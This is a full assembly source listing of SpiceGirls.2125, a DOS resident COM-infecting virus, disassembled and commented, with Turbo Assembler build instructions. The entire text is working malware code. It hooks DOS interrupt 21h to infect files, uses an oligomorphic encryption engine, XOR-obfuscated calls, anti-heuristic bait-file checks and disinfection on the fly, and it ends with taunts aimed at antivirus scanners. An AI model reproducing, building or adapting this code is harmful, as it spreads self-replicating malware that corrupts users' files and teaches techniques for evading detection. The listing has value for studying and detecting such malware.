   ; comment *
   ;               SpiceGirls.2125
   ;               Disassembled by
   ;                 Darkman/29A
   ;
   ;   SpiceGirls.2125 is a 2125 bytes parasitic resident COM virus. Infects fi-
   ;   les at open file, close file, get or set file attributes, load and/or exe-
   ;   cute program and rename file by prepending an EXE header and the virus to
   ;   the infected file. SpiceGirls.2125 has an error handler, anti-heuristic
   ;   techniques, anti-debugging techniques, disinfection on fly and is oligo-
   ;   morphic in file using its internal oligomorphic engine.
   ;
   ;   To compile SpiceGirls.2125 with Turbo Assembler v 4.0 type:
   ;     TASM /m SPIC2125.ASM
   ;     TLINK /t /x SPIC2125.OBJ
   ; *

   .model tiny
   .code
    org   100h              ; Origin of SpiceGirls.2125

   head_begin:
   pages_begin:
            db      'MZ'                ; EXE signature
   bytes_on_las dw      (pages_end-pages_begin) mod 200h
   pages_in_fil dw      (pages_end-pages_begin)/200h
            dw      (relo_end-relo_begin)/04h
            dw      (head_end-head_begin)/10h
            dw      00h,01h         ; Minimum-, maximum number of para...
            dw      0ffeah,stack_ptr    ; Pointer to stack
            db      'SG'                ; Checksum
            dd      0ffea00b2h      ; Pointer to service request + 02h
            dw      relocations-100h    ; Offset of relocations - 100h
            dw      00h         ; Overlay number (main program)
   relo_begin:
   relocations  dd      0ffea0178h,0ffea017ch,0ffea0180h,0ffea0184h,0ffea0188h
            dd      0ffea018ch,0ffea0190h,0ffea0194h,0ffea01beh,0ffea01f8h
            dd      0ffea0206h,0ffea0218h,0ffea0228h,0ffea025ch,0ffea0272h
   relo_end:
            db      08h dup(00h)
   head_end:
   code_begin:
            db      ' - Spice_Girls.2125 - '
   stack_ptr:
            dd      07h dup(0ffea00b2h) ; Seven pointers to service reques...

            dw      virus_begin     ; Offset of virus_begin
            dw      0ffeah      ; Segment of virus_begin
            dw      crypt_begin     ; Offset of crypt_begin
   crypt_size   dw      (crypt_end-crypt_begin)/02h
   crypt_key    dw      00h         ; 16-bit encryption/decryption key
   virus_begin:
   pop_reg16    equ     byte ptr $      ; POP reg16
            pop     di cx ax        ; Load registers from stack
   decrypt_loop:
   decrypt_algo equ     byte ptr $+01h  ; Decryption algorithme
   index_reg    equ     byte ptr $+02h  ; 16-bit index register
            add     cs:[di],ax      ; Decrypt two bytes
   index_reg_   equ     byte ptr $+01h  ; 16-bit index register
   add_idx_imm8 equ     byte ptr $+02h  ; 8-bit immediate
            add     di,02h      ; DI = offset of next encrypted byte

            loop    decrypt_loop

            nop
   crypt_begin:
            mov     cs:[psp_segment],ds ; Store segment of PSP for current...

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            nop
            nop
            nop

            call    find_name
   virus_exit:
            mov     ax,(3000h+'S')      ; SpiceGirls.2125 function
            nop
            db      9ah         ; CALL imm32 (opcode 9ah)
            dd      0ffea00b0h      ; Pointer to service request

            call    install
   eternal_loop:
            jc      eternal_loop    ; Error? Jump to eternal_loop

            jmp     virus_exit

   find_name    proc    near        ; Find filename
            push    ds          ; Save DS at stack
            mov     ds,[psp_segment]    ; DS = segment of PSP for current ...
            mov     ds,ds:[2ch]     ; DS = segment of environment for ...
            xor     si,si       ; Zero SI
   find_zero:
            lodsb           ; AL = byte of environment block
            cmp     al,00h      ; Last environment variable?
            jne     find_zero       ; Not equal? Jump to find_zero
            lodsb           ; AL = byte of environment block
            cmp     al,00h      ; Last environment variable?
            jne     find_zero       ; Not equal? Jump to find_zero

            add     si,02h      ; SI = offset of filename
   find_zero_:
            lodsb           ; AL = byte of filename
            cmp     al,00h      ; End of filename?
            jne     find_zero_      ; Not equal? Jump to find_zero_

            sub     si,02h      ; SI = offset of last character by...

            mov     byte ptr [si],0ffh  ; Store last byte of file extension

            pop     ds          ; Load DS from stack

            ret             ; Return!
            endp

   install      proc    near        ; Allocate memory, move virus to t...
            mov     ah,(48h xor 'S')    ; Allocate memory
            xor     ah,'S'
            mov     bx,0ffffh       ; BX = number of paragraphs to all...
            nop
            db      9ah         ; CALL imm32 (opcode 9ah)
            dd      0ffea00b0h      ; Pointer to service request

            mov     ah,(48h xor 'S')    ; Allocate memory
            xor     ah,'S'
            sub     bx,(memory_end-head_begin+0fh)/10h+01h
            db      9ah         ; CALL imm32 (opcode 9ah)
            dd      0ffea00b0h      ; Pointer to service request
            jc      install_exit    ; Error? Jump to install_exit
            mov     bp,ax       ; BP = segment of allocated block

            mov     ah,(48h xor 'S')    ; Allocate memory
            xor     ah,'S'
            mov     bx,(memory_end-head_begin+0fh)/10h
            nop
            db      9ah         ; CALL imm32 (opcode 9ah)
            dd      0ffea00b0h      ; Pointer to service request
            jc      install_exit    ; Error? Jump to install_exit

            xchg    ax,bp       ; AX = segment of allocated block
            push    es          ; Save ES at stack
            mov     es,ax       ; ES = segment of allocated block
            mov     ah,(49h xor 'S')    ; Free memory
            xor     ah,'S'
            db      9ah         ; CALL imm32 (opcode 9ah)
            dd      0ffea00b0h      ; Pointer to service request

            sub     bp,10h      ; Subtract ten from segment of all...
            mov     es,bp       ; ES = segment of allocated block
            mov     word ptr es:[0f1h],08h

            lea     si,exe_header   ; SI = offset of exe_header
            mov     di,100h         ; DI = offset of beginning of code
            mov     cx,(header_end-header_begin)
   move_header:
            lodsb           ; AL = byte of exe_header
            stosb           ; Store byte of exe_header

            loop    move_header

            lea     si,virus_begin  ; SI = offset of virus_begin
            mov     cx,(code_end-virus_begin)
   move_virus:
            lodsb           ; AL = byte of virus
            stosb           ; Store byte of virus

            loop    move_virus

            call    correct_relo

            push    ds          ; Save DS at stack

            push    es          ; Save ES at stack
            pop     ds          ; Load DS from stack (ES)

            mov     ax,(3521h xor 'SG') ; Get interrupt vector 21h
            xor     ax,'SG'
            db      9ah         ; CALL imm32 (opcode 9ah)
            dd      0ffea00b0h      ; Pointer to service request
            mov     word ptr [int21_addr],bx
            mov     word ptr [int21_addr+02h],es

            mov     ah,(25h xor 'S')    ; Set interrupt vector 21h
            xor     ah,'S'
            lea     dx,int21_virus  ; DX = offset of int21_virus
            nop
            db      9ah         ; CALL imm32 (opcode 9ah)
            dd      0ffea00b0h      ; Pointer to service request

            pop     ds es       ; Load segments from stack

            clc             ; Clear carry flag
   install_exit:
            ret             ; Return!
            endp

   correct_relo proc    near        ; Correct relocation entries
            lea     si,relocations  ; SI = offset of relocations
            mov     cx,0fh      ; CX = number of relocation entries
   correct_loop:
            mov     di,es:[si]      ; DI = offset of relocation
            add     si,04h      ; SI = offset of next relocation e...
            mov     es:[di],0ffeah  ; Store high-order word of relocat...

            loop    correct_loop

            ret             ; Return!
            endp

   int21_virus  proc    near        ; Interrupt 21h of SpiceGirls.2125
            xor     ah,'S'

            cmp     ax,(3000h xor 5300h+'S')
            je      jmp_spice_fu    ; Equal? Jump to jmp_spice_fu
            cmp     ah,(3dh xor 'S')    ; Open file?
            je      jmp_exam_fil    ; Equal? Jump to jmp_exam_fil
            cmp     ah,(3eh xor 'S')    ; Close file?
            je      jmp_pre_test    ; Equal? Jump to jmp_pre_test
            cmp     ah,(43h xor 'S')    ; Get or set file attributes
            je      jmp_exam_fil    ; Equal? Jump to jmp_exam_fil
            cmp     ah,(4bh xor 'S')    ; Load and/or execute program?
            je      jmp_exam_fil    ; Equal? Jump to jmp_exam_fil
            cmp     ah,(56h xor 'S')    ; Rename file
            je      jmp_exam_fil    ; Equal? Jump to jmp_exam_fil
   int21_exit:
            xor     ah,'S'

            jmp     cs:[int21_addr]
            endp
   jmp_spice_fu:
            jmp     spice_functi

            nop
   jmp_exam_fil:
            jmp     examine_file
   jmp_pre_test:
            jmp     pre_tst_func
   spice_functi:
            add     sp,04h      ; Correct stack pointer
            popf            ; Load flags from stack

            mov     [file_handle_],'SG'

            mov     ax,[origin_off]     ; AX = offset of original code
            mov     cs:[origin_off],ax  ; Store offset of original code

            mov     ax,ds:[psp_segment] ; AX = segment of PSP for current ...
            mov     cs:[psp_segment],ax ; Store segment of PSP for current...

            mov     ds,cs:[psp_segment] ; DS = segment of PSP for current ...
            mov     es,cs:[psp_segment] ; ES = segment of PSP for current ...

            mov     ah,(4ah xor 'S')    ; Resize memory block
            xor     ah,'S'
            mov     bx,0ffffh       ; BX = new size in paragraphs
            call    int21_simula

            mov     ah,(4ah xor 'S')    ; Resize memory block
            xor     ah,'S'
            sub     bx,04h      ; BX = new size in paragraphs
            call    int21_simula

            cli             ; Clear interrupt-enable flag
            mov     ss,cs:[psp_segment] ; SS = segment of PSP for current ...
            mov     sp,0fffah       ; SP = stack pointer
            sti             ; Set interrupt-enable flag

            mov     word ptr ds:[0fffeh],00h
            mov     ds:[0fffch],ds  ; Store segment of PSP for current...
            mov     ds:[0fffah],100h    ; Store instruction pointer

            std             ; Set direction flag
            mov     si,cs:[origin_off]  ; SI = offset of original code
            add     si,100h         ; Add offset of beginning of code
            add     si,(code_end-code_begin)

            mov     di,cs:[origin_off]  ; DI = offset of original code
            add     di,100h         ; Add offset of beginning of code
            add     di,(code_end-head_begin)

            dec     si          ; Decrease SI
            dec     di          ; Decrease DI
            mov     cx,cs:[origin_off]  ; CX = offset of original code
   move_origin:
            lodsb           ; AL = byte of original code
            stosb           ; Store byte of original code

            loop    move_origin

            cld             ; Clear direction flag
            mov     si,cs:[origin_off]  ; SI = offset of original code
            add     si,100h         ; Add offset of beginning of code
            mov     di,100h         ; DI = offset of beginning of code
            mov     cx,(code_end-head_begin)
   move_origin_:
            lodsb           ; AL = byte of original code
            stosb           ; Store byte of original code

            loop    move_origin_

            xor     ax,ax       ; Zero AX
            xor     cx,cx       ; Zero CX
            xor     dx,dx       ; Zero DX
            xor     bx,bx       ; Zero BX
            xor     bp,bp       ; Zero BP
            xor     si,si       ; Zero SI
            xor     di,di       ; Zero DI

            retf            ; Return far!
   examine_file:
            mov     cs:[dos_function],ah
            mov     word ptr cs:[name_pointer],dx
            mov     word ptr cs:[name_pointer+02h],ds

            pushf           ; Save flags at stack
            push    ax cx dx bx bp si di es ds

            sti             ; Set interrupt-enable flag
            cld             ; Clear direction flag

            call    int24_store

            mov     si,word ptr cs:[name_pointer]
            mov     ds,word ptr cs:[name_pointer+02h]

            call    examine_name
            jc      infect_exit     ; Error? Jump to infect_exit

            mov     dx,word ptr cs:[name_pointer]
            mov     ds,word ptr cs:[name_pointer+02h]

            call    test_exe_sig
            jc      infect_exit     ; Error? Jump to infect_exit

            mov     dx,word ptr cs:[name_pointer]
            mov     ds,word ptr cs:[name_pointer+02h]

            call    tst_filesize
            jc      infect_exit     ; Error? Jump to infect_exit

            mov     dx,word ptr cs:[name_pointer]
            mov     ds,word ptr cs:[name_pointer+02h]

            call    infect_file
   infect_exit:
            mov     si,word ptr cs:[name_pointer]
            mov     ds,word ptr cs:[name_pointer+02h]

            call    test_infect
            jc      examin_exit     ; Error? Jump to examin_exit

            mov     ah,cs:[dos_function]

            mov     si,word ptr cs:[name_pointer]
            mov     ds,word ptr cs:[name_pointer+02h]

            call    test_functio
   examin_exit:
            call    int24_load

            pop     ds es di si bp bx dx cx ax
            popf            ; Load flags from stack

            jmp     int21_exit

   int24_store  proc    near        ; Get and set interrupt vector 24h
            xor     ax,ax       ; Zero AX
            mov     ds,ax       ; DS = segment of interrupt table
            mov     ax,ds:[24h*04h]     ; AX = offset of interrupt 24h
            mov     word ptr cs:[int24_addr],ax
            mov     ax,ds:[24h*04h+02h] ; AX = segment of interrupt 24h
            mov     word ptr cs:[int24_addr+02h],ax
            mov     word ptr ds:[24h*04h],offset int24_virus
            mov     ds:[24h*04h+02h],cs ; Set interrupt segment 24h

            ret             ; Return!
            endp

   examine_name proc    near        ; Examine filename
            lodsb           ; AL = byte of filename
            cmp     al,00h      ; End of filename?
            jne     examine_name    ; Not equal? Jump to examine_name

            sub     si,07h      ; SI = offset of last two bytes of...
            lodsw           ; AX = two bytes of filename
            and     ax,0101111101011111b
            cmp     ax,'DN'             ; COMMAND.COM?
            je      examin_exit_    ; Equal? Jump to examin_exit_

            lodsb           ; AL = dot after filename
            cmp     al,'.'              ; Dot after filename?
            jne     examin_exit_    ; Not equal? Jump to examin_exit_

            lodsw           ; AX = two bytes of file extension
            and     ax,0101111101011111b
            xor     ax,'SG'
            cmp     ax,('OC' xor 'SG')  ; COM executable?
            jne     examin_exit_    ; Not equal? Jump to examin_exit_

            lodsb           ; AL = byte of file extension
            and     al,01011111b    ; Upcase character
            xor     al,'S'
            cmp     al,('M' xor 'S')    ; COM executable?
            jne     examin_exit_    ; Not equal? Jump to examin_exit_

            clc             ; Clear carry flag

            ret             ; Return!
   examin_exit_:
            stc             ; Set carry flag

            ret             ; Return!
            endp

   test_exe_sig proc    near        ; Test EXE signature
            mov     ax,(3d00h xor 'SG') ; Open file (read)
            xor     ax,'SG'
            call    int21_simula
            jc      tst_sig_exit    ; Error? Jump to tst_sig_exit
            xchg    ax,bx       ; BX = file handle

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     ah,(3fh xor 'S')    ; Read from file
            xor     ah,'S'
            lea     dx,exe_head_sig     ; DX = offset of exe_head_sig
            mov     cx,02h      ; Read two bytes
            call    int21_simula

            mov     ah,(3eh xor 'S')    ; Close file
            xor     ah,'S'
            call    int21_simula

            mov     ax,('ZM' xor 'SG')  ; AX = EXE signature
            xor     ax,'SG'
            cmp     [exe_head_sig],ax   ; Found EXE signature?
            je      tst_sig_exit    ; Equal? Jump to tst_sig_exit

            mov     ax,('MZ' xor 'SG')  ; AX = EXE signature
            xor     ax,'SG'
            cmp     [exe_head_sig],ax   ; Found EXE signature?
            je      tst_sig_exit    ; Equal? Jump to tst_sig_exit

            clc             ; Clear carry flag

            ret             ; Return!
   tst_sig_exit:
            stc             ; Set carry flag

            ret             ; Return!
            endp

   tst_filesize proc    near        ; Test filesize
            mov     ax,(3d00h xor 'SG') ; Open file (read)
            xor     ax,'SG'
            call    int21_simula
            xchg    ax,bx       ; BX = file handle

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     ax,(4202h xor 'SG') ; Set current file position (EOF)
            xor     ax,'SG'
            xor     cx,cx       ; Zero CX
            xor     dx,dx       ; Zero DX
            call    int21_simula

            push    ax dx       ; Save registers at stack
            mov     ah,(3eh xor 'S')    ; Close file
            xor     ah,'S'
            call    int21_simula
            pop     dx ax       ; Load registers from stack

            cmp     ax,(code_end-head_begin)
            jb      tst_siz_exit    ; Filesize too small? Jump to tst_...
            cmp     dx,00h      ; Filesize too large?
            ja      tst_siz_exit    ; Above? Jump to tst_siz_exit
            cmp     ax,0ea60h       ; Filesize too large?
            ja      tst_siz_exit    ; Above? Jump to tst_siz_exit

            mov     [origin_off],ax     ; Store offset of original code

            xor     dx,dx       ; Zero DX
            mov     cx,200h
            div     cx          ; Divide by pages
            cmp     dx,00h      ; Bait file?
            je      tst_siz_exit    ; Equal? Jump to tst_siz_exit

            mov     ax,[origin_off]     ; Store offset of original code

            xor     dx,dx       ; Zero DX
            mov     cx,3e8h
            div     cx          ; Divide by thousands
            cmp     dx,00h      ; Bait file?
            je      tst_siz_exit    ; Equal? Jump to tst_siz_exit

            clc             ; Clear carry flag

            ret             ; Return!
   tst_siz_exit:
            stc             ; Set carry flag

            ret             ; Return!
            endp

   int21_simula proc    near        ; Simulate interrupt 21h
            pushf           ; Save flags at stack

            call    cs:[int21_addr]

            ret             ; Return!
            endp

   infect_file  proc    near        ; Infect COM file
            mov     ax,(4300h xor 'SG') ; Get file attributes
            xor     ax,'SG'
            call    int21_simula
            mov     cs:[file_attr],cx   ; Store file attributes

            mov     ax,(4301h xor 'SG') ; Set file attributes
            xor     ax,'SG'
            xor     cx,cx       ; CX = new file attributes
            call    int21_simula

            mov     ax,(3d02h xor 'SG') ; Open file (read/write)
            xor     ax,'SG'
            call    int21_simula
            jnc     load_info       ; No error? Jump to load_info

            jmp     infect_exit_
   load_info:
            xchg    ax,bx       ; BX = file handle

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     ax,(5700h xor 'SG') ; Set file's date and time
            xor     ax,'SG'
            call    int21_simula
            mov     [file_time],cx  ; Store file time
            mov     [file_date],dx  ; Store file date

            push    ds          ; Save DS at stack
            mov     ax,0bf00h       ; AX = segment of text video RAM
            mov     ds,ax       ; DS =    "    "   "     "    "

            mov     ah,(3fh xor 'S')    ; Read from file
            xor     ah,'S'
            xor     dx,dx       ; Zero DX
            mov     cx,(code_end-head_begin)
            call    int21_simula

            push    ax          ; Save AX at stack
            mov     ax,(4202h xor 'SG') ; Set current file position (EOF)
            xor     ax,'SG'
            xor     cx,cx       ; Zero CX
            xor     dx,dx       ; Zero DX
            call    int21_simula
            pop     cx          ; Load CX from stack (AX)

            mov     ah,(40h xor 'S')    ; Write to file
            xor     ah,'S'
            xor     dx,dx       ; Zero DX
            call    int21_simula
            pop     ds          ; Load DS from stack

            mov     ax,(4200h xor 'SG') ; Set current file position (SOF)
            xor     ax,'SG'
            xor     cx,cx       ; Zero CX
            xor     dx,dx       ; Zero DX
            call    int21_simula

            mov     ax,[origin_off]     ; Store offset of original code
            add     ax,(code_end-head_begin)
            xor     dx,dx       ; Zero DX
            mov     cx,200h
            div     cx          ; Divide by pages
            inc     ax          ; Increase AX
            mov     [pages_in_fil],ax   ; Store total number of 512-bytes ...
            mov     [bytes_on_las],dx   ; Store number of bytes on last 51...

            push    ds          ; Save DS at stack
            mov     ax,0bf00h       ; AX = segment of text video RAM
            mov     ds,ax       ; DS =    "    "   "     "    "

            call    spice_oligo

            mov     ah,(40h xor 'S')    ; Write to file
            xor     ah,'S'
            mov     cx,(code_end-head_begin)
            xor     dx,dx       ; Zero DX
            call    int21_simula
            pop     ds          ; Load DS from stack

            mov     ax,(5701h xor 'SG') ; Set file's date and time
            xor     ax,'SG'
            mov     cx,[file_time]  ; CX = file time
            mov     dx,[file_date]  ; DX = file date
            call    int21_simula

            mov     ah,(3eh xor 'S')    ; Close file
            xor     ah,'S'
            call    int21_simula
   infect_exit_:
            mov     ax,(4301h xor 'SG') ; Set file attributes
            xor     ax,'SG'
            mov     ds,word ptr [name_pointer+02h]
            mov     cx,cs:[file_attr]   ; CX = file attributes
            mov     dx,word ptr cs:[name_pointer]
            call    int21_simula

            ret             ; Return!
            endp

   spice_oligo  proc    near        ; SpiceGirls.2125 oligomorphic engine
            push    ds          ; Save DS at stack

            push    ds          ; Save DS at stack
            pop     es          ; Load ES from stack (DS)

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            in      al,40h      ; AL = 8-bit random number
            mov     byte ptr [crypt_key],al
            xor     al,'S'
            mov     byte ptr [crypt_key+01h],al

            mov     ah,al       ; AH = 8-bit random number
            and     ah,00000001b    ; AH = 16-bit index register
            mov     [index_reg__],ah    ; Store 16-bit index register

            ror     al,01h      ; AL = 8-bit random number
            mov     ah,al       ; AH = encryption/decryption algor...
            and     ah,00000001b    ; AH =       "              "
            mov     [crypt_algo],ah     ; Store encryption/decryption algo...

            mov     al,5eh      ; POP SI (opcode 5eh)
            or      al,[index_reg__]    ; POP reg16
            mov     [pop_reg16],al  ; Store POP reg16

            mov     al,[crypt_algo]     ; AL = encryption/decryption algor...
            mov     ah,00h      ; Zero AH
            add     ax,offset algo_table
            mov     si,ax       ; SI = offset of decryption algori...
            mov     al,[si]         ; AL = decryption algorithme
            mov     [decrypt_algo],al   ; Store decryption algorithme

            mov     al,04h      ; AL = 16-bit index register
            or      al,[index_reg__]    ; AL =   "      "      "
            mov     [index_reg],al  ; Store 16-bit index register

            mov     al,0c6h         ; AL = 16-bit index register
            or      al,[index_reg__]    ; AL =   "      "      "
            mov     [index_reg_],al     ; Store 16-bit index register
            mov     [add_idx_imm8],02h  ; Store 8-bit immediate

            mov     al,[crypt_algo]     ; AL = encryption/decryption algor...
            xor     al,00000001b    ; Invert first bit of AL
            mov     ah,00h      ; Zero AH
            add     ax,offset algo_table
            mov     si,ax       ; SI = offset of encryption algori...
            mov     al,[si]         ; AL = encryption algorithme
            mov     [encrypt_algo],al   ; Store encryption algorithme

            mov     si,100h         ; SI = offset of beginning of code
            xor     di,di       ; Zero DI
            mov     cx,(code_end-head_begin)
   move_virus_:
            lodsb           ; AL = byte of virus
            stosb           ; Store byte of virus

            loop    move_virus_

            lea     si,crypt_begin-100h ; SI = offset of crypt_begin
            mov     cx,[crypt_size]     ; CX = number of bytes to encrypt
            mov     ax,[crypt_key]  ; AX = encryption/decryption key

            jmp     encrypt_loop
   encrypt_loop:
   encrypt_algo equ     byte ptr $+01h  ; Encryption algorithme
            sub     es:[si],ax      ; Encrypt two bytes

            add     si,02h      ; SI = offset of next encrypted byte

            loop    encrypt_loop

            pop     ds          ; Load DS from stack

            ret             ; Return!
            endp

   index_reg__  db      ?           ; 16-bit index register
   crypt_algo   db      ?           ; Encryption/decryption algortihme
   algo_table   db      01h         ; ADD segment:[index],AX
            db      29h         ; SUB segment:[index],AX

   test_infect  proc    near        ; Test for previously infection
            lodsb           ; AL = byte of filename
            cmp     al,00h      ; End of filename?
            jne     test_infect     ; Not equal? Jump to test_infect

            sub     si,04h      ; SI = offset of file extension
            lodsw           ; AX = two bytes of file extension
            and     ax,0101111101011111b
            xor     ax,'SG'
            cmp     ax,('OC' xor 'SG')  ; COM executable?
            jne     tst_inf_exit    ; Not equal? Jump to tst_inf_exit

            lodsb           ; AL = byte of file extension
            cmp     al,0ffh         ; Allready infected?
            jne     tst_inf_exit    ; Not equal? Jump to tst_inf_exit

            clc             ; Clear carry flag

            ret             ; Return!
   tst_inf_exit:
            stc             ; Set carry flag

            ret             ; Return!
            endp

   test_functio proc    near        ; Test DOS function number
            cmp     ah,(3dh xor 'S')    ; Open file?
            je      jmp_create      ; Equal? Jump to jmp_create
            cmp     ah,(3eh xor 'S')    ; Close file?
            je      jmp_delete      ; Equal? Jump to jmp_delete

            ret             ; Return!
            endp
   jmp_create:
            jmp     create_clean

            nop
   jmp_delete:
            jmp     delete_clean
   create_clean:
            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            mov     si,dx       ; SI = offset of filename
            lea     di,filename     ; DI = offset of filename
            mov     cx,40h      ; Move sixty-four bytes of the fil...
   move_name:
            lodsb           ; AL = byte of filename
            stosb           ; Store byte of filename

            loop    move_name

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     ah,(3ch xor 'S')    ; Create file
            xor     ah,'S'
            xor     cx,cx       ; CX = file attributes
            lea     dx,filename     ; DX = offset of filename
            call    int21_simula
            jnc     store_handle    ; No error? Jump to store_handle

            jmp     clean_exit
   store_handle:
            mov     bp,ax       ; BP = file handle
            mov     [file_handle_],ax   ; Store file handle
            lea     si,filename     ; SI = offset of filename
   find_zero__:
            lodsb           ; AL = byte of filename
            cmp     al,00h      ; End of filename?
            jne     find_zero__     ; Not equal? Jump to find_zero__

            sub     si,02h      ; SI = offset of last character by...

            mov     byte ptr [si],'M'   ; Store last byte of file extension

            mov     ax,(3d00h xor 'SG') ; Open file (read)
            xor     ax,'SG'
            lea     dx,filename     ; DX = offset of filename
            call    int21_simula
            jnc     store_extens    ; No error? Jump to store_extens

            jmp     clean_exit
   store_extens:
            mov     bx,ax       ; BX = file handle
            mov     byte ptr [si],0ffh  ; Store last byte of file extension

            mov     ax,0bf00h       ; AX = segment of text video RAM
            mov     ds,ax       ; DS =    "    "   "     "    "

            mov     ax,(4202h xor 'SG') ; Set current file position (EOF)
            xor     ax,'SG'
            mov     cx,-01h         ; CX = end of file
            mov     dx,-(code_end-head_begin)
            call    int21_simula

            mov     si,ax       ; SI = original filesize
            sub     si,(code_end-head_begin)

            mov     ah,(3fh xor 'S')    ; Read from file
            xor     ah,'S'
            mov     cx,(code_end-head_begin)
            xor     dx,dx       ; Zero DX
            call    int21_simula
            xchg    bx,bp       ; BX = file handle

            mov     ah,(40h xor 'S')    ; Write to file
            xor     ah,'S'
            mov     cx,(code_end-head_begin)
            xor     dx,dx       ; Zero DX
            call    int21_simula
            xchg    bx,bp       ; BX = file handle

            mov     ax,(4200h xor 'SG') ; Set current file position (SOF)
            xor     ax,'SG'
            xor     cx,cx       ; Zero CX
            mov     dx,(code_end-head_begin)
            call    int21_simula
   tst_file_pos:
            mov     cx,1000h        ; CX = number of bytes to read
            cmp     si,cx       ; Read less than four thousand and...
            jae     read_file       ; Above or equal? Jump to read_file

            mov     cx,si       ; CX = number of bytes to read
   read_file:
            mov     di,cx       ; DI = number of bytes to read

            mov     ah,(3fh xor 'S')    ; Read from file
            xor     ah,'S'
            xor     dx,dx       ; Zero DX
            call    int21_simula
            mov     cx,ax       ; CX = number of bytes actually read
            xchg    bx,bp       ; BX = file handle

            mov     ah,(40h xor 'S')    ; Write to file
            xor     ah,'S'
            xor     dx,dx       ; Zero DX
            call    int21_simula
            xchg    bx,bp       ; BX = file handle

            sub     si,di       ; SI = bytes left to read
            cmp     si,00h      ; Read all of the file?
            jne     tst_file_pos    ; Not equal? Jump to tst_file_pos

            mov     ah,(3eh xor 'S')    ; Close file
            xor     ah,'S'
            call    int21_simula
            xchg    bx,bp       ; BX = file handle

            mov     ah,(3eh xor 'S')    ; Close file
            xor     ah,'S'
            call    int21_simula

            ret             ; Return!
   clean_exit:
            mov     [file_handle_],'SG'

            ret             ; Return!
   delete_clean:
            cmp     cs:[file_handle_],bx
            jne     dont_delete     ; Don't delete disinfected file

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     ah,(41h xor 'S')    ; Delete file
            xor     ah,'S'
            lea     dx,filename     ; DX = offset of filename
            call    int21_simula

            mov     [file_handle_],'SG'
   dont_delete:
            ret             ; Return!

   int24_load   proc    near        ; Set interrupt vector 24h
            xor     ax,ax       ; Zero AX
            mov     ds,ax       ; DS = segment of interrupt table
            mov     ax,word ptr cs:[int24_addr]
            mov     ds:[24h*04h],ax     ; Store segment of interrupt 24h
            mov     ax,word ptr cs:[int24_addr+02h]
            mov     ds:[24h*04h+02h],ax ; Store segment of interrupt 24h

            ret             ; Return!
            endp
   pre_tst_func:
            mov     cs:[dos_function],ah
            mov     cs:[file_handle],bx ; Store file handle

            pushf           ; Save flags at stack
            push    ax cx dx bx bp si di es ds

            sti             ; Set interrupt-enable flag
            cld             ; Clear direction flag

            call    int24_store

            mov     ah,cs:[dos_function]
            mov     bx,cs:[file_handle] ; BX = file handle
            call    test_functio

            call    int24_load

            pop     ds es di si bp bx dx cx ax
            popf            ; Load flags from stack

            jmp     int21_exit

   int24_virus  proc    near        ; Interrupt 24h of SpiceGirls.2125
            mov     al,03h      ; Fail system call in progress

            iret            ; Interrupt return!
            endp

            db      0dh,0ah,'What? ''Error: invalid program''? Me? Fprot, are you crazy? :)'
            db      0dh,0ah,'And you, Avp, ''EXE file but COM extension''. What a deep scan. ;)'
            db      0dh,0ah,'Spice_Girls virus causes problems to your scan engine eh? :)'
            db      0dh,0ah,'$'
   header_begin:
   exe_header   db      'MZ'                ; EXE signature
            dw      (pages_end-pages_begin) mod 200h
            dw      (pages_end-pages_begin)/200h
            dw      (relo_end-relo_begin)/04h
            dw      (head_end-head_begin)/10h
            dw      00h,01h         ; Minimum-, maximum number of para...
            dw      0ffeah,stack_ptr    ; Pointer to stack
            db      'SG'                ; Checksum
            dd      0ffea00b2h      ; Pointer to service request + 02h
            dw      relocations-100h    ; Offset of relocations - 100h
            dw      00h         ; Overlay number (main program)
            dd      0ffea0178h,0ffea017ch,0ffea0180h,0ffea0184h,0ffea0188h
            dd      0ffea018ch,0ffea0190h,0ffea0194h,0ffea01beh,0ffea01f8h
            dd      0ffea0206h,0ffea0218h,0ffea0228h,0ffea025ch,0ffea0272h
            db      08h dup(00h)
            db      ' - Spice_Girls.2125 - '
            dd      07h dup(0ffea00b2h) ; Seven pointers to service reques...
            dw      virus_begin     ; Offset of virus_begin
            dw      0ffeah      ; Segment of virus_begin
            dw      crypt_begin     ; Offset of crypt_begin
            dw      (crypt_end-crypt_begin)/02h
            dw      00h         ; 16-bit encryption/decryption key
   header_end:
   psp_segment  dw      ?           ; Segment of PSP for current proce...
   int21_addr   dd      ?           ; Address of interrupt 21h
   int24_addr   dd      ?           ; Address of interrupt 24h
   dos_function db      ?           ; DOS function number
   name_pointer dd      ?           ; Pointer to filename
   file_handle  dw      ?           ; File handle
   exe_head_sig dw      ?           ; EXE header signature
   file_attr    dw      ?           ; File attributes
   file_time    dw      ?           ; File time
   file_date    dw      ?           ; File date
   origin_off   dw      terminate-100h  ; Offset of original code
   file_handle_ dw      ?           ; File handle
   filename     db      40h dup(?)      ; Filename
   crypt_end:
            db      00h
   code_end:
   memory_end:
   terminate:
            mov     ax,4c00h        ; Terminate with return code
            int     21h

            db      241h dup(90h)
   pages_end:

   end      head_begin
